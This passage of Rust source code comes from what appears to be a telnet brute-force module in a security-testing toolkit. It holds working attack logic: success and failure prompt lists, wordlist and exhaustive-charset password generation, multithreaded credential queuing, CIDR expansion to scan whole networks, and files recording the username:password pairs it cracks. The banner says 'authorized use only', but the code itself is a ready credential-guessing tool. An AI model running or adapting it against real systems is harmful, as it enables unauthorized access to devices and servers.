     "cisco", "ios>", "ios#", "[root@", "[admin@", "bash-", "sh-",
     "press any key", "continue", "enter command", "available commands", "type help"
     ].iter().map(|s| s.to_string()).collect(),
     vec![
         "incorrect", "failed", "denied", "invalid", "authentication failed",
     "% authentication", "% bad", "access denied", "login incorrect",
     "permission denied", "not authorized", "authentication error",
     "bad password", "wrong password", "authentication failure",
     "login failed", "invalid login", "invalid password", "invalid username",
     "bad username", "user unknown", "unknown user", "connection refused",
     "connection closed", "connection reset", "too many", "maximum"
     ].iter().map(|s| s.to_string()).collect(),
    )
}

async fn load_and_validate_config(path: &str, target: &str) -> Result<TelnetBruteforceConfig> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut config: TelnetBruteforceConfig = serde_json::from_str(&content)?;
    config.target = target.to_string();
    config.preprocess_prompts();

    let mut errors = Vec::new();

    if config.port == 0 { errors.push("Port must be > 0".to_string()); }
    if config.threads == 0 || config.threads > 256 {
        errors.push("Threads must be 1-256".to_string());
    }
    if !(1..=60).contains(&config.connection_timeout) {
        errors.push("Connection timeout: 1-60s".to_string());
    }

    if !errors.is_empty() {
        return Err(anyhow!("Validation errors:\n  - {}", errors.join("\n  - ")));
    }

    Ok(config)
}

async fn save_config(config: &TelnetBruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)?;
    tokio::fs::write(path, json).await?;
    Ok(())
}

fn print_config_summary(config: &TelnetBruteforceConfig) {
    println!("\n{}", "=== Configuration ===".bold().cyan());
    println!("  Target:     {}:{}", config.target, config.port);
    println!("  Threads:    {}", config.threads);
    println!("  Delay:      {}ms", config.delay_ms);
    println!("  Output:     {}", config.output_file);
    println!("{}", "====================".cyan());
}

fn print_config_format() {
    println!("{}", "=== JSON Configuration Format ===".bold().cyan());
    println!("{}", r##"{
    "port": 23,
    "username_wordlist": "users.txt",
    "password_wordlist": "passwords.txt",
    "threads": 8,
    "delay_ms": 100,
    "connection_timeout": 3,
    "read_timeout": 1,
    "stop_on_success": false,
    "verbose": false,
    "full_combo": false,
    "raw_bruteforce": false,
    "raw_charset": "abcdefghijklmnopqrstuvwxyz",
    "raw_min_length": 1,
    "raw_max_length": 4,
    "output_file": "results.txt",
    "append_mode": false,
    "pre_validate": true,
    "retry_on_error": true,
    "max_retries": 2,
    "login_prompts": ["login:", "username:"],
    "password_prompts": ["password:"],
    "success_indicators": ["$", "#", "welcome"],
    "failure_indicators": ["incorrect", "failed", "denied"]
}
"##);
    println!("{}", "================================".cyan());
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

fn should_use_streaming(total_size: u64) -> bool {
    if total_size > MAX_MEMORY_SIZE {
        let size_mb = total_size as f64 / (1024.0 * 1024.0);
        println!("\n{}", format!("[!] Large wordlists: {:.1} MB", size_mb).yellow());
        println!("Options:");
        println!("  1. Load into memory (faster, ~{:.0} MB RAM)", size_mb);
        println!("  2. Streaming mode (slower, minimal memory)");
        println!();
        !prompt_yes_no("Load into memory? (y/n): ", true)
    } else {
        false
    }
}

async fn load_wordlists_streaming(
    config: &TelnetBruteforceConfig,
) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
    println!("[*] Using streaming mode...");
    let user_count = count_nonempty_lines(&config.username_wordlist).await?;
    let pass_count = if let Some(ref path) = config.password_wordlist {
        count_nonempty_lines(path).await?
    } else {
        0
    };
    Ok((Vec::new(), Vec::new(), user_count, pass_count))
}

async fn load_wordlists_memory(
    config: &TelnetBruteforceConfig,
) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
    println!("[*] Loading wordlists into memory...");
    let (usernames, passwords) = tokio::join!(
        load_wordlist(&config.username_wordlist),
                                              async {
                                                  if let Some(ref path) = config.password_wordlist {
                                                      load_wordlist(path).await
                                                  } else {
                                                      Ok(Vec::new())
                                                  }
                                              }
    );

    let usernames = usernames?;
    let passwords = passwords?;
    Ok((usernames.clone(), passwords.clone(), usernames.len(), passwords.len()))
}

fn calculate_estimated_attempts(
    config: &TelnetBruteforceConfig,
    username_count: usize,
    password_count: usize,
) -> usize {
    let mut estimated = if config.full_combo {
        username_count * password_count
    } else if username_count == 1 {
        password_count
    } else if password_count == 1 {
        username_count
    } else {
        password_count
    };

    if config.raw_bruteforce {
        let charset_len = config.raw_charset.chars().count();
        let mut raw_total = 0u64;
        for len in config.raw_min_length..=config.raw_max_length {
            raw_total += charset_len.pow(len as u32) as u64;
        }
        println!("[*] Raw bruteforce: ~{} passwords", raw_total);

        let users_for_raw = if config.full_combo || username_count == 1 {
            username_count as u64
        } else {
            1
        };
        estimated += (raw_total * users_for_raw) as usize;
    }

    estimated
}

async fn initialize_output_file(output_file: &str, config: &TelnetBruteforceConfig) -> Result<()> {
    if !config.append_mode {
        let mut f = File::create(output_file).await?;
        f.write_all(format!("# Telnet Results - {}\n", chrono::Local::now()).as_bytes()).await?;
        f.write_all(format!("# Target: {}:{}\n", config.target, config.port).as_bytes()).await?;
        f.write_all(b"# Format: username:password\n\n").await?;
    }
    Ok(())
}

async fn validate_telnet_target(addr: &str, config: &TelnetBruteforceConfig) -> Result<()> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let mut stream = timeout(
        Duration::from_secs(config.connection_timeout),
                             TcpStream::connect(socket)
    ).await??;

    let mut buf = vec![0u8; 1024];
    match timeout(Duration::from_secs(config.read_timeout), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();
            if response.contains("login") || response.contains("username") ||
                response.contains("telnet") || response.contains("password") {
                    Ok(())
                } else {
                    Err(anyhow!("No telnet prompts detected"))
                }
        }
        _ => Err(anyhow!("No response from target")),
    }
}

async fn append_result(output_file: &str, username: &str, password: &str) -> Result<()> {
    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open(output_file)
    .await?;

    file.write_all(format!("{}:{}\n", username, password).as_bytes()).await?;
    file.flush().await?;
    Ok(())
}

async fn print_final_report(
    found_creds: &Arc<Mutex<HashSet<(String, String)>>>,
                            output_file: &str,
) {
    let found = found_creds.lock().await;
    println!();
    if found.is_empty() {
        println!("{}", "[-] No valid credentials found".yellow());
    } else {
        println!("{}", format!("[+] Found {} credential(s):", found.len()).green().bold());
        let mut sorted: Vec<_> = found.iter().collect();
        sorted.sort();
        for (u, p) in sorted.iter() {
            println!("  {}  {}:{}", "✓".green(), u, p);
        }
        println!("\n[*] Results saved to: {}", output_file);
    }
}

async fn load_wordlist(path: &str) -> Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content
    .lines()
    .filter_map(|s| {
        let trimmed = s.trim();
        (!trimmed.is_empty()).then(|| trimmed.to_string())
    })
    .collect())
}

async fn count_nonempty_lines(path: &str) -> Result<usize> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content.lines().filter(|line| !line.trim().is_empty()).count())
}

fn parse_targets(input: &str) -> Result<Vec<String>> {
    let mut targets = Vec::new();

    for line in input.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if line.contains('/') {
            match line.parse::<ipnetwork::IpNetwork>() {
                Ok(network) => {
                    for ip in network.iter() {
                        targets.push(ip.to_string());
                    }
                }
                Err(_) => println!("{} Invalid CIDR: {}", "[!]".yellow(), line),
            }
        } else {
            targets.push(line.to_string());
        }
    }

    Ok(targets)
}

async fn load_credentials_file(path: &str) -> Result<Vec<(String, String)>> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut creds = Vec::new();

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if let Some((user, pass)) = line.split_once(':') {
            creds.push((user.trim().to_string(), pass.trim().to_string()));
        }
    }

    Ok(creds)
}

fn save_batch_results(results: &[ScanResult], filename: &str) -> Result<()> {
    let mut file = std::fs::OpenOptions::new()
    .create(true)
    .append(true)
    .open(filename)?;

    use std::io::Write;
    for result in results {
        let creds_str = match &result.credentials {
            Some((u, p)) => format!("{}/{}", u, if p.is_empty() { "(blank)" } else { p }),
            None => "none".to_string(),
        };

        writeln!(
            file,
            "[{}] {}:{} - {} - banner: {}",
            result.timestamp,
            result.ip,
            result.port,
            creds_str,
            result.banner.replace('\n', " ").replace('\r', "")
        )?;
    }

    Ok(())
}

// ============================================================
// COMBO GENERATION FUNCTIONS
// ============================================================

#[inline]
async fn enqueue_wordlist_combos_fast(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                                      usernames: &[Arc<str>],
                                      passwords: &[Arc<str>],
                                      full_combo: bool,
                                      stop_flag: Arc<AtomicBool>,
) -> Result<()> {
    if passwords.is_empty() {
        return Ok(());
    }

    if full_combo {
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            for pass in passwords {
                if stop_flag.load(Ordering::Relaxed) { break; }
                tx.send((user.clone(), pass.clone())).await.ok();
            }
        }
    } else if usernames.len() == 1 {
        let user = &usernames[0];
        for pass in passwords {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    } else if passwords.len() == 1 {
        let pass = &passwords[0];
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    } else {
        let user = &usernames[0];
        for pass in passwords {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    }

    Ok(())
}

async fn generate_raw_combos(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                             usernames: &[Arc<str>],
                             charset: Vec<char>,
                             min_len: usize,
                             max_len: usize,
                             full_combo: bool,
                             stop_flag: Arc<AtomicBool>,
) -> Result<()> {
    if charset.is_empty() || max_len == 0 {
        return Ok(());
    }

    let base = charset.len();

    for len in min_len..=max_len {
        if stop_flag.load(Ordering::Relaxed) { break; }

        let mut indices = vec![0usize; len];

        loop {
            if stop_flag.load(Ordering::Relaxed) { break; }

            let pwd: String = indices.iter().map(|&i| charset[i]).collect();
            let pwd_arc: Arc<str> = Arc::from(pwd.as_str());

            if full_combo || usernames.len() == 1 {
                for user in usernames {
                    if stop_flag.load(Ordering::Relaxed) { break; }
                    tx.send((user.clone(), pwd_arc.clone())).await.ok();
                }
            } else {
                let user = &usernames[0];
                tx.send((user.clone(), pwd_arc)).await.ok();
            }

            let mut carry = true;
            for i in (0..len).rev() {
                if carry {
                    indices[i] += 1;
                    if indices[i] < base {
                        carry = false;
                    } else {
                        indices[i] = 0;
                    }
                }
            }

            if carry { break; }
        }
    }

    Ok(())
}

async fn enqueue_wordlist_combos_streaming(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                                           username_path: &str,
                                           password_path: &str,
                                           full_combo: bool,
                                           stop_flag: Arc<AtomicBool>,
                                           username_count: usize,
                                           _password_count: usize,
) -> Result<()> {
    if full_combo {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let user_arc: Arc<str> = Arc::from(user);

            let pass_file = File::open(password_path).await?;
            let pass_reader = BufReader::new(pass_file);
            let mut pass_lines = pass_reader.lines();

            while let Some(pass_line) = pass_lines.next_line().await? {
                let pass = pass_line.trim();
                if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
                    continue;
                }
                let pass_arc: Arc<str> = Arc::from(pass);
                tx.send((user_arc.clone(), pass_arc)).await.ok();
            }
        }
    } else if username_count == 1 {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let user_arc: Arc<str> = Arc::from(user_line.trim());

        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();

        while let Some(pass_line) = pass_lines.next_line().await? {
            let pass = pass_line.trim();
            if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let pass_arc: Arc<str> = Arc::from(pass);
            tx.send((user_arc.clone(), pass_arc)).await.ok();
        }
    } else {
        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();
        let pass_line = pass_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let pass_arc: Arc<str> = Arc::from(pass_line.trim());

        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let user_arc: Arc<str> = Arc::from(user);
            tx.send((user_arc, pass_arc.clone())).await.ok();
        }
    }

    Ok(())
}

async fn generate_raw_combos_streaming(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                                       username_path: &str,
                                       charset: Vec<char>,
                                       min_len: usize,
                                       max_len: usize,
                                       full_combo: bool,
                                       stop_flag: Arc<AtomicBool>,
                                       username_count: usize,
) -> Result<()> {
    if charset.is_empty() || max_len == 0 {
        return Ok(());
    }

    let base = charset.len();

    if full_combo || username_count == 1 {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let mut usernames: Vec<Arc<str>> = Vec::new();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if !user.is_empty() {
                usernames.push(Arc::from(user));
            }
        }

        for len in min_len..=max_len {
            if stop_flag.load(Ordering::Relaxed) { break; }

            let mut indices = vec![0usize; len];

            loop {
                if stop_flag.load(Ordering::Relaxed) { break; }

                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
                let pwd_arc: Arc<str> = Arc::from(pwd.as_str());

                for user in &usernames {
                    if stop_flag.load(Ordering::Relaxed) { break; }
                    tx.send((user.clone(), pwd_arc.clone())).await.ok();
                }

                let mut carry = true;
                for i in (0..len).rev() {
                    if carry {
                        indices[i] += 1;
                        if indices[i] < base {
                            carry = false;
                        } else {
                            indices[i] = 0;
                        }
                    }
                }

                if carry { break; }
            }
        }
    } else {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let user_arc: Arc<str> = Arc::from(user_line.trim());

        for len in min_len..=max_len {
            if stop_flag.load(Ordering::Relaxed) { break; }

            let mut indices = vec![0usize; len];

            loop {
                if stop_flag.load(Ordering::Relaxed) { break; }

                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
                let pwd_arc: Arc<str> = Arc::from(pwd.as_str());

                tx.send((user_arc.clone(), pwd_arc)).await.ok();

                let mut carry = true;
                for i in (0..len).rev() {
                    if carry {
                        indices[i] += 1;
                        if indices[i] < base {
                            carry = false;
                        } else {
                            indices[i] = 0;
                        }
                    }
                }

                if carry { break; }
            }
        }
    }

    Ok(())
}

// ============================================================
// PROMPT/INPUT FUNCTIONS
// ============================================================

fn display_banner() {
    println!();
    println!("{}", "╔══════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║   TELNET SECURITY TESTING MODULE            ║".bright_cyan());
    println!("{}", "║   Advanced Bruteforce & Batch Scanner       ║".bright_cyan());
    println!("{}", "╚══════════════════════════════════════════════╝".bright_cyan());
    println!();
    println!("{}", "⚠️  AUTHORIZED USE ONLY".yellow().bold());
    println!("{}", "    Unauthorized access is ILLEGAL".yellow());
    println!();
}

fn prompt(msg: &str) -> String {
    use std::io::Write;
    print!("{}", msg);
    let _ = std::io::stdout().flush();
    let mut buf = String::new();
    match std::io::stdin().read_line(&mut buf) {
        Ok(_) => buf.trim().to_string(),
        Err(_) => String::new(),
    }
}

fn prompt_required(msg: &str) -> String {
    loop {
        let input = prompt(msg);
        if !input.trim().is_empty() {
            return input.trim().to_string();
        }
        println!("[!] This field is required.");
    }
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt(&format!("Port (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u16>() {
            Ok(port) if port > 0 => return port,
            _ => println!("[!] Invalid port."),
        }
    }
}

fn prompt_delay(default: u64) -> u64 {
    loop {
        let input = prompt(&format!("Delay in ms (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val <= 10000 => return val,
            _ => println!("[!] Invalid delay (max 10000ms)."),
        }
    }
}

fn prompt_timeout(msg: &str, default: u64) -> u64 {
    loop {
        let input = prompt(msg);
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val > 0 && val <= 60 => return val,
            _ => println!("[!] Invalid timeout (1-60s)."),
        }
    }
}

fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Threads (default {}): ", default));
        if input.is_empty() {
            return default.max(1);
        }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= 256 => return val,
            _ => println!("[!] Invalid (1-256)."),
        }
    }
}

fn prompt_retries(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Max retries (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val <= 10 => return val,
            _ => println!("[!] Invalid (max 10)."),
        }
    }
}

fn prompt_yes_no(message: &str, default: bool) -> bool {
    loop {
        let input = prompt(message);
        if input.is_empty() {
            return default;
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" => return true,
            "n" | "no" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = path.trim();
        if Path::new(trimmed).is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!("[!] File '{}' not found.", trimmed);
        }
    }
}

fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            return Ok(None);
        }
        let trimmed = path.trim();
        if Path::new(trimmed).is_file() {
            return Ok(Some(trimmed.to_string()));
        } else {
            println!("[!] File '{}' not found.", trimmed);
        }
    }
}

fn prompt_charset(prompt_text: &str, default: &str) -> String {
    let input = prompt(prompt_text);
    if input.is_empty() {
        default.to_string()
    } else {
        input.trim().to_string()
    }
}

fn prompt_min_length(default: usize, min: usize, max: usize) -> usize {
    loop {
        let input = prompt(&format!("Min length ({}-{}, default {}): ", min, max, default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val >= min && val <= max => return val,
            _ => println!("[!] Invalid ({}-{}).", min, max),
        }
    }
}

fn prompt_max_length(default: usize, min: usize, max: usize) -> usize {
    loop {
        let input = prompt(&format!("Max length ({}-{}, default {}): ", min, max, default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val >= min && val <= max => return val,
            _ => println!("[!] Invalid ({}-{}).", min, max),
        }
    }
}

fn prompt_list(prompt_text: &str) -> Vec<String> {
    let input = prompt(prompt_text);
    input
    .split(',')
    .map(|s| s.trim().to_string())
    .filter(|s| !s.is_empty())
    .collect()
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    use once_cell::sync::Lazy;
    static TARGET_REGEX: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$")
        .expect("Invalid regex")
    });

    let caps = TARGET_REGEX
    .captures(host.trim())
    .ok_or_else(|| anyhow!("Invalid target format"))?;

    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str().parse::<u16>()?
    } else {
        default_port
    };

    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };

    formatted.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    Ok(formatted)
}
